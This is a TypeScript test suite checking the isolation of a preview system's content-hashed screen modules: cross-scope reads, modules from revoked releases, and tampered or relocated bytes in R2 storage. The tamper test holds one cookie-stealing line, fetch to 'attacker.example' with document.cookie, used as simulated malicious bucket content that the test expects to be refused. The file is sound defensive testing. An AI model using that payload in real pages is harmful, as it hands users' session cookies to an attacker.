import { appIdSchema } from "@grasp-os/shared/ids";
import { env } from "cloudflare:workers";
import { describe, expect, it } from "vite-plus/test";

import { revokeRelease } from "../src/release-retention.ts";
import { release } from "./apps.ts";
import { mockIdp } from "./idp.ts";
import { deskDraft, deskFiles } from "./preview-drafts.ts";
import { chatWithDraft } from "./previews.ts";
import {
  loadFrame,
  moduleKeyOf,
  modulePartsOf,
  pathOf,
  routed,
} from "./screen-frames.ts";
import type { LoadedFrame } from "./screen-frames.ts";
import { person as actingPerson } from "./sealed-apps.ts";
import { signedInApi } from "./sign-in.ts";

// A preview's modules on content-hashed addresses (core's screen-frame.ts),
// from its threat model: what a frame holds is a token for its own scope
// of modules, the preview's or its build's, as a segment of their
// addresses; core serves a module only under the scope it staged it in,
// with its MAC over that scope, the module's address and its bytes. The
// ways it can fail: a frame reads another App's module, or another chat's
// draft's, by its hash; it reads a module of a release revoked since,
// with the token of the release after it; and bytes changed in R2, or
// moved there from another scope, are served as if core staged them.

const idp = mockIdp();

/** A frame's document and modules, as core serves them for `open`. */
const framed = async (open: {
  artifact: string;
  frameToken: string;
}): Promise<LoadedFrame> => {
  const frame = await loadFrame(open);
  if (frame === null) {
    throw new Error("An opened screen has a frame");
  }
  return frame;
};

/** The address of `frame`'s screen module. */
const screenModuleOf = (frame: LoadedFrame): string => frame.screen.entry;

/** What core answers for the module at `scope`, under `token`, by its `hash`. */
const asked = async ({
  scope,
  token,
  hash,
}: {
  scope: string;
  token: string;
  hash: string;
}): Promise<number> => {
  const response = await routed(`/screen-modules/${scope}/${token}/${hash}.js`);
  return response.status;
};

describe(
  "a preview's modules on content-hashed addresses",
  { timeout: 180_000 },
  () => {
    it("reads only modules of its own preview's scope: not another App's, nor another chat's draft's, by their hashes", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId } = await deskDraft(builder);
      const own = await framed(
        await builder.api.chats.preview(chatId, app, "desk")
      );
      // Another App of the same builder, published.
      const { id: otherId } = await builder.api.apps.create({ name: "Other" });
      await release(builder, otherId, deskFiles("Other"));
      const otherApp = await framed(
        await builder.api.screens.open(otherId, "desk")
      );
      // Another chat's draft of the same App.
      const { chatId: otherChat } = await chatWithDraft(builder, app, {
        "screens/desk.tsx": deskFiles("Elsewhere")["screens/desk.tsx"] ?? "",
      });
      const otherDraft = await framed(
        await builder.api.chats.preview(otherChat, app, "desk")
      );
      const mine = modulePartsOf(screenModuleOf(own));
      const theirs = [otherApp, otherDraft].map((frame) =>
        modulePartsOf(screenModuleOf(frame))
      );
      expect({
        own: await asked(mine),
        // Its hash, under the frame's own scope and token: kept nowhere there.
        underOwnScope: await Promise.all(
          theirs.map(async ({ hash }) => await asked({ ...mine, hash }))
        ),
        // Its hash and scope, under the frame's token: not that scope's.
        underOwnToken: await Promise.all(
          theirs.map(
            async ({ scope, hash }) => await asked({ ...mine, scope, hash })
          )
        ),
        // A hash with no token for its scope.
        noToken: await asked({ ...mine, token: "1.AAAA" }),
      }).toStrictEqual({
        own: 200,
        underOwnScope: [404, 404],
        underOwnToken: [403, 403],
        noToken: 403,
      });
    });

    it("reads no module of a release revoked since, with the token of the release after it", async () => {
      const builder = await signedInApi(idp, "builder");
      const { id } = await builder.api.apps.create({ name: "Desk" });
      const app = appIdSchema.parse(id);
      await release(builder, app, deskFiles("First"));
      const first = await framed(await builder.api.screens.open(app, "desk"));
      await release(builder, app, deskFiles("Second"));
      await revokeRelease(
        env,
        await actingPerson("admin"),
        { app, version: 1 },
        "Leaks data"
      );
      const second = await framed(await builder.api.screens.open(app, "desk"));
      const revoked = modulePartsOf(screenModuleOf(first));
      const current = modulePartsOf(screenModuleOf(second));
      expect({
        current: await asked(current),
        underCurrentScope: await asked({ ...current, hash: revoked.hash }),
        underCurrentToken: await asked({
          ...current,
          scope: revoked.scope,
          hash: revoked.hash,
        }),
      }).toStrictEqual({
        current: 200,
        underCurrentScope: 404,
        underCurrentToken: 403,
      });
    });

    it("serves no module whose bytes were changed in R2, or moved there from another scope, and stages it again at the next update", async () => {
      const builder = await signedInApi(idp, "builder");
      const { app, chatId, revision } = await deskDraft(builder);
      const opened = await builder.api.chats.preview(chatId, app, "desk");
      const frame = await framed(opened);
      const { chatId: otherChat } = await chatWithDraft(builder, app, {
        "screens/desk.tsx": deskFiles("Elsewhere")["screens/desk.tsx"] ?? "",
      });
      const other = await framed(
        await builder.api.chats.preview(otherChat, app, "desk")
      );
      const address = screenModuleOf(frame);
      const key = moduleKeyOf(address);
      const staged = await env.FILES.get(key);
      const original = await staged?.text();
      // Whoever can write the bucket swaps the module's code, and keeps
      // what else core stored beside it.
      await env.FILES.put(
        key,
        'fetch("https://attacker.example/" + document.cookie);',
        { customMetadata: staged?.customMetadata ?? {} }
      );
      const tampered = await routed(pathOf(address));
      const removed = (await env.FILES.head(key)) === null;
      // Or moves another chat's module into this scope, with its MAC.
      const elsewhere = await env.FILES.get(moduleKeyOf(screenModuleOf(other)));
      const otherHash = modulePartsOf(screenModuleOf(other)).hash;
      const moved = `${new URL("./", address).href}${otherHash}.js`;
      await env.FILES.put(moduleKeyOf(moved), (await elsewhere?.text()) ?? "", {
        customMetadata: elsewhere?.customMetadata ?? {},
      });
      const movedResponse = await routed(pathOf(moved));
      const movedServed = movedResponse.status;
      // The next update stages what it loads again, from core's own build.
      const updated = await builder.api.chats.previewUpdate(
        chatId,
        app,
        "desk",
        revision
      );
      const healed = await routed(pathOf(address));
      expect({
        tampered: {
          status: tampered.status,
          cache: tampered.headers.get("cache-control"),
        },
        removed,
        moved: movedServed,
        sameModule: updated.refresh.entry === modulePartsOf(address).hash,
        healed: { status: healed.status, code: await healed.text() },
      }).toStrictEqual({
        tampered: { status: 404, cache: "no-store" },
        removed: true,
        moved: 404,
        sameModule: true,
        healed: { status: 200, code: original },
      });
    });
  }
);
